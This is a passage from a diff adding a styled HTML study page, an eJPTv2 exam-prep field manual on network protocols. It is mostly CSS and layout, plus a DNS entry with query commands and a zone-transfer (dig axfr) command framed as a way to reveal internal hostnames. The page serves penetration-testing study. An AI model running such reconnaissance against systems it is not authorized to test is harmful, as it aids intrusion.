@@ -1,0 +1,1959 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Network Protocols — eJPTv2 Field Manual</title>
+<link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&family=Rajdhani:wght@400;500;600;700&family=IBM+Plex+Mono:wght@400;500&display=swap" rel="stylesheet">
+<style>
+/* ─────────────────────────────────────────
+   ROOT & THEME
+───────────────────────────────────────── */
+:root {
+  --bg0: #0a0d0b;
+  --bg1: #0e1210;
+  --bg2: #141a15;
+  --bg3: #1a2319;
+  --bg4: #1f2b1e;
+  --border: rgba(74,180,90,0.12);
+  --border2: rgba(74,180,90,0.22);
+  --border3: rgba(74,180,90,0.4);
+  --g0: #4ab45a;
+  --g1: #38a347;
+  --g2: #2d8c3e;
+  --g3: #1e6b2e;
+  --g4: #4ade80;
+  --gray: #7a8a7c;
+  --gray2: #a0b0a2;
+  --gray3: #c8d8ca;
+  --text: #d4e8d6;
+  --text2: #9ab09c;
+  --text3: #6a7a6c;
+  --red: #e05555;
+  --amber: #e09030;
+  --blue: #5595e0;
+  --cyan: #45c8c0;
+  --purple: #9080d0;
+  --scan-color: rgba(74,180,90,0.04);
+}
+
+* { box-sizing: border-box; margin: 0; padding: 0; }
+
+body {
+  background: var(--bg0);
+  color: var(--text);
+  font-family: 'Rajdhani', sans-serif;
+  font-size: 15px;
+  line-height: 1.5;
+  overflow-x: hidden;
+}
+
+/* Scanline overlay */
+body::before {
+  content: '';
+  position: fixed;
+  top: 0; left: 0; right: 0; bottom: 0;
+  background: repeating-linear-gradient(
+    0deg,
+    transparent,
+    transparent 2px,
+    var(--scan-color) 2px,
+    var(--scan-color) 4px
+  );
+  pointer-events: none;
+  z-index: 1000;
+  opacity: 0.4;
+}
+
+/* ─────────────────────────────────────────
+   HEADER
+───────────────────────────────────────── */
+.site-header {
+  background: var(--bg1);
+  border-bottom: 1px solid var(--border2);
+  padding: 0 24px;
+  position: sticky;
+  top: 0;
+  z-index: 100;
+}
+.header-inner {
+  max-width: 1400px;
+  margin: 0 auto;
+  display: flex;
+  align-items: center;
+  gap: 20px;
+  height: 56px;
+}
+.header-logo {
+  font-family: 'Share Tech Mono', monospace;
+  font-size: 13px;
+  color: var(--g0);
+  display: flex;
+  align-items: center;
+  gap: 10px;
+  flex-shrink: 0;
+}
+.logo-bracket { color: var(--g3); }
+.logo-pulse {
+  width: 8px; height: 8px;
+  border-radius: 50%;
+  background: var(--g0);
+  animation: pulse 2s ease-in-out infinite;
+}
+@keyframes pulse {
+  0%,100% { opacity: 1; transform: scale(1); box-shadow: 0 0 0 0 rgba(74,180,90,0.4); }
+  50% { opacity: 0.7; transform: scale(1.1); box-shadow: 0 0 0 6px rgba(74,180,90,0); }
+}
+.header-title {
+  font-size: 17px;
+  font-weight: 700;
+  color: var(--gray3);
+  letter-spacing: 2px;
+  text-transform: uppercase;
+}
+.header-right {
+  margin-left: auto;
+  display: flex;
+  align-items: center;
+  gap: 16px;
+}
+.header-stat {
+  font-family: 'Share Tech Mono', monospace;
+  font-size: 11px;
+  color: var(--text3);
+  display: flex; align-items: center; gap: 6px;
+}
+.header-stat span { color: var(--g0); }
+.search-wrap {
+  position: relative;
+}
+.search-input {
+  background: var(--bg3);
+  border: 1px solid var(--border2);
+  border-radius: 4px;
+  color: var(--text);
+  font-family: 'Share Tech Mono', monospace;
+  font-size: 12px;
+  padding: 6px 12px 6px 32px;
+  width: 200px;
+  outline: none;
+  transition: border-color 0.2s, width 0.3s;
+}
+.search-input:focus { border-color: var(--border3); width: 260px; }
+.search-input::placeholder { color: var(--text3); }
+.search-icon {
+  position: absolute;
+  left: 10px; top: 50%;
+  transform: translateY(-50%);
+  color: var(--text3);
+  font-size: 12px;
+  pointer-events: none;
+}
+
+/* ─────────────────────────────────────────
+   HERO
+───────────────────────────────────────── */
+.hero {
+  background: var(--bg1);
+  border-bottom: 1px solid var(--border);
+  padding: 40px 24px 32px;
+  position: relative;
+  overflow: hidden;
+}
+.hero-bg-grid {
+  position: absolute;
+  inset: 0;
+  background-image:
+    linear-gradient(var(--border) 1px, transparent 1px),
+    linear-gradient(90deg, var(--border) 1px, transparent 1px);
+  background-size: 40px 40px;
+  opacity: 0.5;
+}
+.hero-bg-glow {
+  position: absolute;
+  top: -100px; left: 50%;
+  transform: translateX(-50%);
+  width: 600px; height: 300px;
+  background: radial-gradient(ellipse, rgba(56,163,71,0.08) 0%, transparent 70%);
+  pointer-events: none;
+}
+.hero-inner {
+  max-width: 1400px;
+  margin: 0 auto;
+  position: relative;
+  z-index: 1;
+}
+.hero-eyebrow {
+  font-family: 'Share Tech Mono', monospace;
+  font-size: 11px;
+  color: var(--g0);
+  letter-spacing: 3px;
+  text-transform: uppercase;
+  margin-bottom: 12px;
+  display: flex; align-items: center; gap: 10px;
+}
+.hero-eyebrow::before {
+  content: '';
+  display: block;
+  width: 24px; height: 1px;
+  background: var(--g0);
+}
+.hero h1 {
+  font-size: clamp(28px, 4vw, 52px);
+  font-weight: 700;
+  color: var(--gray3);
+  letter-spacing: -1px;
+  line-height: 1.1;
+  margin-bottom: 12px;
+}
+.hero h1 em { font-style: normal; color: var(--g4); }
+.hero-sub {
+  color: var(--text2);
+  font-size: 15px;
+  max-width: 600px;
+  margin-bottom: 28px;
+  font-weight: 500;
+}
+.hero-tags {
+  display: flex; flex-wrap: wrap; gap: 8px;
+}
+.hero-tag {
+  font-family: 'Share Tech Mono', monospace;
+  font-size: 11px;
+  padding: 4px 10px;
+  border-radius: 2px;
+  border: 1px solid;
+}
+.tag-ejpt { color: var(--g0); border-color: rgba(74,180,90,0.35); background: rgba(74,180,90,0.07); }
+.tag-layer { color: var(--cyan); border-color: rgba(69,200,192,0.3); background: rgba(69,200,192,0.06); }
+.tag-protocols { color: var(--amber); border-color: rgba(224,144,48,0.3); background: rgba(224,144,48,0.06); }
+
+/* ─────────────────────────────────────────
+   FILTER BAR
+───────────────────────────────────────── */
+.filter-bar {
+  background: var(--bg2);
+  border-bottom: 1px solid var(--border);
+  padding: 0 24px;
+  position: sticky;
+  top: 56px;
+  z-index: 90;
+}
+.filter-inner {
+  max-width: 1400px;
+  margin: 0 auto;
+  display: flex;
+  align-items: center;
+  gap: 4px;
+  overflow-x: auto;
+  scrollbar-width: none;
+  padding: 10px 0;
+}
+.filter-inner::-webkit-scrollbar { display: none; }
+.filter-btn {
+  flex-shrink: 0;
+  background: transparent;
+  border: 1px solid var(--border2);
+  color: var(--text3);
+  font-family: 'Rajdhani', sans-serif;
+  font-size: 13px;
+  font-weight: 500;
+  padding: 5px 14px;
+  border-radius: 2px;
+  cursor: pointer;
+  transition: all 0.15s;
+  white-space: nowrap;
+  letter-spacing: 0.5px;
+}
+.filter-btn:hover { color: var(--text2); border-color: var(--border3); background: var(--bg3); }
+.filter-btn.active { color: var(--g4); border-color: var(--g0); background: rgba(74,180,90,0.08); }
+.filter-sep { width: 1px; height: 20px; background: var(--border2); flex-shrink: 0; margin: 0 6px; }
+
+/* ─────────────────────────────────────────
+   MAIN LAYOUT
+───────────────────────────────────────── */
+.main-layout {
+  max-width: 1400px;
+  margin: 0 auto;
+  display: grid;
+  grid-template-columns: 240px 1fr;
+  gap: 0;
+  min-height: calc(100vh - 160px);
+}
+
+/* Sidebar */
+.sidebar {
+  border-right: 1px solid var(--border);
+  padding: 20px 0;
+  position: sticky;
+  top: 112px;
+  height: calc(100vh - 112px);
+  overflow-y: auto;
+  scrollbar-width: thin;
+  scrollbar-color: var(--border2) transparent;
+}
+.sidebar-section-label {
+  font-family: 'Share Tech Mono', monospace;
+  font-size: 10px;
+  letter-spacing: 2px;
+  color: var(--text3);
+  text-transform: uppercase;
+  padding: 6px 20px 8px;
+  margin-top: 8px;
+}
+.sidebar-item {
+  display: flex;
+  align-items: center;
+  gap: 10px;
+  padding: 8px 20px;
+  cursor: pointer;
+  transition: background 0.12s;
+  border-left: 2px solid transparent;
+  position: relative;
+}
+.sidebar-item:hover { background: var(--bg2); }
+.sidebar-item.active {
+  background: rgba(74,180,90,0.06);
+  border-left-color: var(--g0);
+}
+.sidebar-item.active .si-name { color: var(--g4); }
+.si-port {
+  font-family: 'Share Tech Mono', monospace;
+  font-size: 10px;
+  color: var(--text3);
+  min-width: 36px;
+  flex-shrink: 0;
+}
+.si-name {
+  font-size: 13px;
+  font-weight: 600;
+  color: var(--text2);
+  letter-spacing: 0.5px;
+}
+.si-dot {
+  width: 5px; height: 5px;
+  border-radius: 50%;
+  margin-left: auto;
+  flex-shrink: 0;
+}
+
+/* Content area */
+.content-area {
+  padding: 28px 32px;
+}
+
+/* ─────────────────────────────────────────
+   PROTOCOL CARD
+───────────────────────────────────────── */
+.protocol-card {
+  background: var(--bg1);
+  border: 1px solid var(--border);
+  border-radius: 4px;
+  margin-bottom: 24px;
+  overflow: hidden;
+  transition: border-color 0.2s;
+}
+.protocol-card:hover { border-color: var(--border2); }
+.protocol-card.hidden { display: none; }
+
+/* Card Header */
+.pc-header {
+  padding: 18px 24px 16px;
+  background: var(--bg2);
+  border-bottom: 1px solid var(--border);
+  cursor: pointer;
+  display: flex;
+  align-items: flex-start;
+  gap: 16px;
+  user-select: none;
+}
+.pc-num {
+  font-family: 'Share Tech Mono', monospace;
+  font-size: 11px;
+  color: var(--text3);
+  min-width: 28px;
+  padding-top: 3px;
+}
+.pc-icon {
+  width: 36px; height: 36px;
+  border-radius: 4px;
+  display: flex; align-items: center; justify-content: center;
+  font-size: 16px;
+  flex-shrink: 0;
+}
+.pc-meta { flex: 1; min-width: 0; }
+.pc-title-row { display: flex; align-items: center; gap: 12px; flex-wrap: wrap; }
+.pc-name {
+  font-size: 22px;
+  font-weight: 700;
+  color: var(--gray3);
+  letter-spacing: 1px;
+}
+.pc-fullname {
+  font-size: 12px;
+  color: var(--text3);
+  font-weight: 500;
+}
+.pc-badges { display: flex; gap: 6px; flex-wrap: wrap; margin-top: 6px; }
+.badge {
+  font-family: 'Share Tech Mono', monospace;
+  font-size: 10px;
+  padding: 2px 8px;
+  border-radius: 2px;
+  border: 1px solid;
+  letter-spacing: 0.5px;
+}
+.badge-port { color: var(--g0); border-color: rgba(74,180,90,0.3); background: rgba(74,180,90,0.07); }
+.badge-layer { color: var(--cyan); border-color: rgba(69,200,192,0.25); background: rgba(69,200,192,0.05); }
+.badge-tcp { color: var(--blue); border-color: rgba(85,149,224,0.3); background: rgba(85,149,224,0.06); }
+.badge-udp { color: var(--amber); border-color: rgba(224,144,48,0.3); background: rgba(224,144,48,0.07); }
+.badge-both { color: var(--purple); border-color: rgba(144,128,208,0.3); background: rgba(144,128,208,0.07); }
+.badge-risk-high { color: var(--red); border-color: rgba(224,85,85,0.3); background: rgba(224,85,85,0.07); }
+.badge-risk-med { color: var(--amber); border-color: rgba(224,144,48,0.3); background: rgba(224,144,48,0.07); }
+.badge-risk-low { color: var(--g0); border-color: rgba(74,180,90,0.3); background: rgba(74,180,90,0.07); }
+.pc-expand {
+  font-family: 'Share Tech Mono', monospace;
+  font-size: 11px;
+  color: var(--text3);
+  flex-shrink: 0;
+  transition: transform 0.25s;
+  align-self: center;
+}
+.protocol-card.expanded .pc-expand { transform: rotate(180deg); }
+
+/* Card Body */
+.pc-body { display: none; }
+.protocol-card.expanded .pc-body { display: block; }
+
+/* Tabs */
+.pc-tabs {
+  display: flex;
+  border-bottom: 1px solid var(--border);
+  background: var(--bg2);
+  padding: 0 24px;
+  gap: 0;
+  overflow-x: auto;
+  scrollbar-width: none;
+}
+.pc-tabs::-webkit-scrollbar { display: none; }
+.tab-btn {
+  background: transparent;
+  border: none;
+  border-bottom: 2px solid transparent;
+  color: var(--text3);
+  font-family: 'Rajdhani', sans-serif;
+  font-size: 13px;
+  font-weight: 600;
+  letter-spacing: 1px;
+  text-transform: uppercase;
+  padding: 10px 16px;
+  cursor: pointer;
+  transition: color 0.15s;
+  white-space: nowrap;
+  flex-shrink: 0;
+}
+.tab-btn:hover { color: var(--text2); }
+.tab-btn.active { color: var(--g4); border-bottom-color: var(--g0); }
+
+/* Tab Panels */
+.tab-panel { display: none; padding: 24px; }
+.tab-panel.active { display: block; }
+
+/* Overview grid */
+.overview-grid {
+  display: grid;
+  grid-template-columns: 1fr 1fr;
+  gap: 16px;
+  margin-bottom: 20px;
+}
+@media (max-width: 700px) { .overview-grid { grid-template-columns: 1fr; } }
+
+.info-block {
+  background: var(--bg2);
+  border: 1px solid var(--border);
+  border-radius: 3px;
+  padding: 14px 16px;
+}
+.info-block h4 {
+  font-family: 'Share Tech Mono', monospace;
+  font-size: 10px;
+  letter-spacing: 2px;
+  color: var(--text3);
+  text-transform: uppercase;
+  margin-bottom: 8px;
+}
+.info-block p {
+  color: var(--text2);
+  font-size: 14px;
+  font-weight: 500;
+  line-height: 1.6;
+}
+.info-block.full { grid-column: 1 / -1; }
+
+/* How it works flow */
+.flow-diagram {
+  display: flex;
+  align-items: center;
+  gap: 0;
+  flex-wrap: wrap;
+  margin: 16px 0;
+}
+.flow-step {
+  background: var(--bg3);
+  border: 1px solid var(--border2);
+  border-radius: 3px;
+  padding: 8px 14px;
+  font-size: 12px;
+  font-weight: 600;
+  color: var(--text2);
+  letter-spacing: 0.5px;
+  white-space: nowrap;
+  font-family: 'Share Tech Mono', monospace;
+}
+.flow-arrow {
+  color: var(--g2);
+  font-size: 16px;
+  padding: 0 6px;
+  flex-shrink: 0;
+}
+.flow-step.highlight {
+  border-color: var(--g2);
+  background: rgba(74,180,90,0.08);
+  color: var(--g4);
+}
+
+/* Packet diagram */
+.packet-diagram {
+  display: flex;
+  border: 1px solid var(--border2);
+  border-radius: 3px;
+  overflow: hidden;
+  font-family: 'Share Tech Mono', monospace;
+  font-size: 11px;
+  margin: 12px 0;
+}
+.pkt-field {
+  flex: 1;
+  padding: 8px 4px;
+  text-align: center;
+  border-right: 1px solid var(--border2);
+  display: flex;
+  flex-direction: column;
+  gap: 3px;
+}
+.pkt-field:last-child { border-right: none; }
+.pkt-field-name { color: var(--text3); font-size: 9px; letter-spacing: 1px; }
+.pkt-field-val { color: var(--text2); font-size: 11px; font-weight: 500; }
+.pkt-field.key { background: rgba(74,180,90,0.07); }
+.pkt-field.key .pkt-field-val { color: var(--g4); }
+
+/* Code blocks */
+.code-block {
+  background: var(--bg0);
+  border: 1px solid var(--border2);
+  border-radius: 3px;
+  padding: 16px;
+  margin: 10px 0;
+  font-family: 'IBM Plex Mono', monospace;
+  font-size: 12px;
+  overflow-x: auto;
+  position: relative;
+}
+.code-block pre { color: var(--text2); white-space: pre; }
+.code-comment { color: var(--text3); }
+.code-cmd { color: var(--g4); }
+.code-flag { color: var(--cyan); }
+.code-target { color: var(--amber); }
+.code-output { color: var(--gray); }
+.code-highlight { color: var(--g0); }
+.code-label {
+  font-family: 'Share Tech Mono', monospace;
+  font-size: 10px;
+  color: var(--text3);
+  margin-bottom: 6px;
+  letter-spacing: 1px;
+  text-transform: uppercase;
+}
+.copy-btn {
+  position: absolute;
+  top: 10px; right: 10px;
+  background: var(--bg3);
+  border: 1px solid var(--border2);
+  color: var(--text3);
+  font-family: 'Share Tech Mono', monospace;
+  font-size: 10px;
+  padding: 3px 8px;
+  border-radius: 2px;
+  cursor: pointer;
+  transition: all 0.15s;
+}
+.copy-btn:hover { color: var(--g4); border-color: var(--g0); }
+
+/* Attack table */
+.attack-table {
+  width: 100%;
+  border-collapse: collapse;
+  font-size: 13px;
+  margin: 12px 0;
+}
+.attack-table th {
+  font-family: 'Share Tech Mono', monospace;
+  font-size: 10px;
+  letter-spacing: 1.5px;
+  color: var(--text3);
+  text-transform: uppercase;
+  text-align: left;
+  padding: 8px 12px;
+  border-bottom: 1px solid var(--border2);
+  background: var(--bg2);
+}
+.attack-table td {
+  padding: 10px 12px;
+  border-bottom: 1px solid var(--border);
+  color: var(--text2);
+  font-weight: 500;
+  vertical-align: top;
+}
+.attack-table tr:last-child td { border-bottom: none; }
+.attack-table tr:hover td { background: var(--bg2); }
+.attack-name { color: var(--g4); font-family: 'Share Tech Mono', monospace; font-size: 12px; }
+.tool-chip {
+  display: inline-block;
+  background: rgba(74,180,90,0.08);
+  border: 1px solid rgba(74,180,90,0.2);
+  color: var(--g0);
+  font-family: 'Share Tech Mono', monospace;
+  font-size: 10px;
+  padding: 2px 7px;
+  border-radius: 2px;
+  margin: 2px 2px 2px 0;
+}
+
+/* Section headings inside panels */
+.panel-heading {
+  font-family: 'Share Tech Mono', monospace;
+  font-size: 11px;
+  letter-spacing: 2px;
+  color: var(--g0);
+  text-transform: uppercase;
+  margin: 20px 0 10px;
+  display: flex;
+  align-items: center;
+  gap: 8px;
+}
+.panel-heading::after {
+  content: '';
+  flex: 1;
+  height: 1px;
+  background: var(--border);
+}
+.panel-heading:first-child { margin-top: 0; }
+
+/* Risk indicator */
+.risk-bar {
+  display: flex;
+  align-items: center;
+  gap: 10px;
+  margin: 8px 0;
+}
+.risk-label { font-size: 12px; color: var(--text3); min-width: 80px; }
+.risk-track {
+  flex: 1;
+  height: 4px;
+  background: var(--bg3);
+  border-radius: 2px;
+  overflow: hidden;
+}
+.risk-fill {
+  height: 100%;
+  border-radius: 2px;
+  transition: width 0.5s ease;
+}
+.risk-high .risk-fill { background: var(--red); }
+.risk-med .risk-fill { background: var(--amber); }
+.risk-low .risk-fill { background: var(--g0); }
+.risk-val { font-family: 'Share Tech Mono', monospace; font-size: 11px; min-width: 32px; text-align: right; }
+.risk-high .risk-val { color: var(--red); }
+.risk-med .risk-val { color: var(--amber); }
+.risk-low .risk-val { color: var(--g0); }
+
+/* Exam tip boxes */
+.exam-tip {
+  background: rgba(74,180,90,0.06);
+  border: 1px solid rgba(74,180,90,0.2);
+  border-left: 3px solid var(--g0);
+  border-radius: 0 3px 3px 0;
+  padding: 12px 14px;
+  margin: 10px 0;
+  font-size: 13px;
+  color: var(--text2);
+  font-weight: 500;
+}
+.exam-tip strong {
+  color: var(--g4);
+  font-family: 'Share Tech Mono', monospace;
+  font-size: 11px;
+  letter-spacing: 1px;
+  display: block;
+  margin-bottom: 4px;
+}
+.field-tip {
+  background: rgba(85,149,224,0.06);
+  border: 1px solid rgba(85,149,224,0.2);
+  border-left: 3px solid var(--blue);
+  border-radius: 0 3px 3px 0;
+  padding: 12px 14px;
+  margin: 10px 0;
+  font-size: 13px;
+  color: var(--text2);
+  font-weight: 500;
+}
+.field-tip strong {
+  color: var(--blue);
+  font-family: 'Share Tech Mono', monospace;
+  font-size: 11px;
+  letter-spacing: 1px;
+  display: block;
+  margin-bottom: 4px;
+}
+
+/* List styles */
+.detail-list {
+  list-style: none;
+  padding: 0;
+}
+.detail-list li {
+  padding: 5px 0 5px 18px;
+  position: relative;
+  color: var(--text2);
+  font-size: 14px;
+  font-weight: 500;
+  border-bottom: 1px solid var(--border);
+}
+.detail-list li:last-child { border-bottom: none; }
+.detail-list li::before {
+  content: '▸';
+  position: absolute;
+  left: 0;
+  color: var(--g2);
+  font-size: 10px;
+  top: 7px;
+}
+
+/* No results */
+.no-results {
+  text-align: center;
+  padding: 60px 20px;
+  color: var(--text3);
+  font-family: 'Share Tech Mono', monospace;
+  display: none;
+}
+.no-results.show { display: block; }
+
+/* Progress summary */
+.progress-bar-wrap {
+  background: var(--bg2);
+  border: 1px solid var(--border);
+  border-radius: 3px;
+  padding: 16px 20px;
+  margin-bottom: 20px;
+}
+.progress-bar-wrap h3 {
+  font-family: 'Share Tech Mono', monospace;
+  font-size: 10px;
+  letter-spacing: 2px;
+  color: var(--text3);
+  text-transform: uppercase;
+  margin-bottom: 10px;
+}
+.pb-track {
+  height: 3px;
+  background: var(--bg3);
+  border-radius: 2px;
+  overflow: hidden;
+  margin-bottom: 6px;
+}
+.pb-fill {
+  height: 100%;
+  background: linear-gradient(90deg, var(--g2), var(--g4));
+  border-radius: 2px;
+  transition: width 0.4s;
+  width: 0%;
+}
+.pb-meta {
+  display: flex;
+  justify-content: space-between;
+  font-family: 'Share Tech Mono', monospace;
+  font-size: 11px;
+  color: var(--text3);
+}
+.pb-meta span { color: var(--g0); }
+
+/* Responsive */
+@media (max-width: 900px) {
+  .main-layout { grid-template-columns: 1fr; }
+  .sidebar { position: static; height: auto; border-right: none; border-bottom: 1px solid var(--border); display: flex; flex-wrap: wrap; padding: 10px; gap: 4px; }
+  .sidebar-item { padding: 6px 10px; border-left: none; border-radius: 3px; }
+  .sidebar-section-label { display: none; }
+  .si-port { display: none; }
+  .content-area { padding: 16px; }
+}
+
+/* Scrollbar */
+::-webkit-scrollbar { width: 5px; height: 5px; }
+::-webkit-scrollbar-track { background: transparent; }
+::-webkit-scrollbar-thumb { background: var(--border2); border-radius: 2px; }
+::-webkit-scrollbar-thumb:hover { background: var(--border3); }
+
+/* Table of contents mini */
+.toc-grid {
+  display: grid;
+  grid-template-columns: repeat(auto-fill, minmax(180px, 1fr));
+  gap: 8px;
+  margin-bottom: 28px;
+}
+.toc-item {
+  background: var(--bg2);
+  border: 1px solid var(--border);
+  border-radius: 3px;
+  padding: 10px 14px;
+  cursor: pointer;
+  transition: all 0.15s;
+  display: flex;
+  align-items: center;
+  gap: 10px;
+}
+.toc-item:hover { border-color: var(--border3); background: var(--bg3); }
+.toc-n { font-family: 'Share Tech Mono', monospace; font-size: 10px; color: var(--text3); }
+.toc-name { font-size: 13px; font-weight: 600; color: var(--text2); }
+.toc-port { font-family: 'Share Tech Mono', monospace; font-size: 10px; color: var(--g0); margin-left: auto; }
+</style>
+</head>
+<body>
+
+<!-- HEADER -->
+<header class="site-header">
+  <div class="header-inner">
+    <div class="header-logo">
+      <div class="logo-pulse"></div>
+      <span class="logo-bracket">[</span>NET_PROTO<span class="logo-bracket">]</span>
+    </div>
+    <div class="header-title">Field Manual</div>
+    <div class="header-right">
+      <div class="header-stat">PROTOCOLS <span>18</span></div>
+      <div class="header-stat">LAYERS <span>L3–L7</span></div>
+      <div class="search-wrap">
+        <span class="search-icon">⌕</span>
+        <input class="search-input" type="text" id="searchInput" placeholder="search protocol..." oninput="filterProtocols()">
+      </div>
+    </div>
+  </div>
+</header>
+
+<!-- HERO -->
+<div class="hero">
+  <div class="hero-bg-grid"></div>
+  <div class="hero-bg-glow"></div>
+  <div class="hero-inner">
+    <div class="hero-eyebrow">eJPTv2 Exam Prep · Network Fundamentals</div>
+    <h1>18 Network <em>Protocols</em><br>Field Manual</h1>
+    <p class="hero-sub">Structure · Working · Packet Flow · Attack Vectors · Enumeration Commands · Exam Tips · Real-World Use Cases</p>
+    <div class="hero-tags">
+      <span class="hero-tag tag-ejpt">eJPTv2 Ready</span>
+      <span class="hero-tag tag-layer">OSI L3–L7</span>
+      <span class="hero-tag tag-protocols">TCP · UDP · Both</span>
+    </div>
+  </div>
+</div>
+
+<!-- FILTER BAR -->
+<div class="filter-bar">
+  <div class="filter-inner">
+    <button class="filter-btn active" onclick="setFilter('all', this)">All (18)</button>
+    <div class="filter-sep"></div>
+    <button class="filter-btn" onclick="setFilter('l3', this)">Layer 3</button>
+    <button class="filter-btn" onclick="setFilter('l4', this)">Layer 4</button>
+    <button class="filter-btn" onclick="setFilter('l7', this)">Layer 7</button>
+    <div class="filter-sep"></div>
+    <button class="filter-btn" onclick="setFilter('tcp', this)">TCP</button>
+    <button class="filter-btn" onclick="setFilter('udp', this)">UDP</button>
+    <div class="filter-sep"></div>
+    <button class="filter-btn" onclick="setFilter('high', this)">High Risk</button>
+    <button class="filter-btn" onclick="setFilter('remote', this)">Remote Access</button>
+    <button class="filter-btn" onclick="setFilter('file', this)">File Transfer</button>
+    <button class="filter-btn" onclick="setFilter('email', this)">Email</button>
+    <button class="filter-btn" onclick="setFilter('infra', this)">Infrastructure</button>
+  </div>
+</div>
+
+<div class="main-layout">
+  <!-- SIDEBAR -->
+  <nav class="sidebar" id="sidebar">
+    <div class="sidebar-section-label">Infrastructure</div>
+    <div class="sidebar-item" onclick="scrollTo('p-dns')"><span class="si-port">53</span><span class="si-name">DNS</span><span class="si-dot" style="background:var(--cyan)"></span></div>
+    <div class="sidebar-item" onclick="scrollTo('p-dhcp')"><span class="si-port">67/68</span><span class="si-name">DHCP</span><span class="si-dot" style="background:var(--amber)"></span></div>
+    <div class="sidebar-item" onclick="scrollTo('p-snmp')"><span class="si-port">161</span><span class="si-name">SNMP</span><span class="si-dot" style="background:var(--red)"></span></div>
+    <div class="sidebar-item" onclick="scrollTo('p-icmp')"><span class="si-port">—</span><span class="si-name">ICMP</span><span class="si-dot" style="background:var(--g0)"></span></div>
+    <div class="sidebar-item" onclick="scrollTo('p-arp')"><span class="si-port">—</span><span class="si-name">ARP</span><span class="si-dot" style="background:var(--red)"></span></div>
+    <div class="sidebar-section-label">Remote Access</div>
+    <div class="sidebar-item" onclick="scrollTo('p-ssh')"><span class="si-port">22</span><span class="si-name">SSH</span><span class="si-dot" style="background:var(--g0)"></span></div>
+    <div class="sidebar-item" onclick="scrollTo('p-telnet')"><span class="si-port">23</span><span class="si-name">Telnet</span><span class="si-dot" style="background:var(--red)"></span></div>
+    <div class="sidebar-item" onclick="scrollTo('p-rdp')"><span class="si-port">3389</span><span class="si-name">RDP</span><span class="si-dot" style="background:var(--red)"></span></div>
+    <div class="sidebar-section-label">File Transfer</div>
+    <div class="sidebar-item" onclick="scrollTo('p-ftp')"><span class="si-port">21</span><span class="si-name">FTP</span><span class="si-dot" style="background:var(--red)"></span></div>
+    <div class="sidebar-item" onclick="scrollTo('p-tftp')"><span class="si-port">69</span><span class="si-name">TFTP</span><span class="si-dot" style="background:var(--amber)"></span></div>
+    <div class="sidebar-item" onclick="scrollTo('p-smb')"><span class="si-port">445</span><span class="si-name">SMB</span><span class="si-dot" style="background:var(--red)"></span></div>
+    <div class="sidebar-section-label">Web</div>
+    <div class="sidebar-item" onclick="scrollTo('p-http')"><span class="si-port">80</span><span class="si-name">HTTP</span><span class="si-dot" style="background:var(--amber)"></span></div>
+    <div class="sidebar-item" onclick="scrollTo('p-https')"><span class="si-port">443</span><span class="si-name">HTTPS</span><span class="si-dot" style="background:var(--g0)"></span></div>
+    <div class="sidebar-section-label">Email</div>
+    <div class="sidebar-item" onclick="scrollTo('p-smtp')"><span class="si-port">25</span><span class="si-name">SMTP</span><span class="si-dot" style="background:var(--amber)"></span></div>
+    <div class="sidebar-item" onclick="scrollTo('p-pop3')"><span class="si-port">110</span><span class="si-name">POP3</span><span class="si-dot" style="background:var(--amber)"></span></div>
+    <div class="sidebar-item" onclick="scrollTo('p-imap')"><span class="si-port">143</span><span class="si-name">IMAP</span><span class="si-dot" style="background:var(--amber)"></span></div>
+    <div class="sidebar-section-label">Database / Other</div>
+    <div class="sidebar-item" onclick="scrollTo('p-mysql')"><span class="si-port">3306</span><span class="si-name">MySQL</span><span class="si-dot" style="background:var(--red)"></span></div>
+    <div class="sidebar-item" onclick="scrollTo('p-mssql')"><span class="si-port">1433</span><span class="si-name">MSSQL</span><span class="si-dot" style="background:var(--red)"></span></div>
+  </nav>
+
+  <!-- CONTENT AREA -->
+  <div class="content-area">
+
+    <!-- Progress tracker -->
+    <div class="progress-bar-wrap">
+      <h3>Study Progress</h3>
+      <div class="pb-track"><div class="pb-fill" id="pbFill"></div></div>
+      <div class="pb-meta"><div id="pbText">0 / 18 protocols studied</div><div><span id="pbPct">0</span>% complete</div></div>
+    </div>
+
+    <!-- Quick TOC -->
+    <div class="toc-grid" id="tocGrid">
+      <!-- filled by JS -->
+    </div>
+
+    <div id="noResults" class="no-results">
+      <div style="font-size:24px;margin-bottom:12px">[ 0x00 ]</div>
+      <div>No protocols matched that query</div>
+    </div>
+
+    <!-- ══════════════════════════════════════════
+         PROTOCOL CARDS
+    ══════════════════════════════════════════ -->
+    <div id="protocolList"></div>
+
+  </div>
+</div>
+
+<script>
+// ──────────────────────────────────────────────
+// PROTOCOL DATA
+// ──────────────────────────────────────────────
+const protocols = [
+  {
+    id: 'p-dns', num: '01', name: 'DNS', full: 'Domain Name System',
+    port: '53', transport: 'both', layer: 'l7', categories: ['infra'],
+    risk: 'med', icon: '🌐', iconBg: 'rgba(69,200,192,0.12)',
+    shortDesc: 'Translates human-readable domain names into IP addresses.',
+    structure: `DNS operates as a hierarchical distributed database. A query flows from the client resolver → recursive resolver → root nameserver → TLD nameserver → authoritative nameserver. The response travels back and is cached.`,
+    packetFields: [
+      {name:'TX ID', val:'0xA1B2', key:false},
+      {name:'Flags', val:'QR|RD|RA', key:false},
+      {name:'Questions', val:'1', key:false},
+      {name:'Query', val:'example.com', key:true},
+      {name:'Type', val:'A / AAAA', key:true},
+      {name:'Answer IP', val:'93.184.x.x', key:false},
+    ],
+    recordTypes: ['A → IPv4 address','AAAA → IPv6 address','MX → Mail server','NS → Nameserver','CNAME → Alias','PTR → Reverse lookup','TXT → Arbitrary text (SPF, DKIM)','SOA → Zone authority','SRV → Service location'],
+    howItWorks: ['Client queries its local resolver','Resolver asks root NS for TLD (.com)','Root NS delegates to .com TLD NS','TLD NS delegates to authoritative NS','Authoritative NS returns the A record IP','Resolver caches TTL, returns to client'],
+    commands: [
+      { label: 'Basic DNS query', code: `<span class="code-cmd">nslookup</span> <span class="code-target">target.com</span>
+<span class="code-cmd">dig</span> <span class="code-target">target.com</span> A
+<span class="code-cmd">dig</span> <span class="code-flag">+short</span> <span class="code-target">target.com</span>` },
+      { label: 'Zone Transfer (AXFR) — gold mine', code: `<span class="code-cmd">dig</span> axfr @<span class="code-target">ns1.target.com</span> <span class="code-target">target.com</span>
+<span class="code-comment"># If AXFR is allowed → dumps ALL DNS records</span>
+<span class="code-comment"># Often reveals internal hostnames!</span>` },
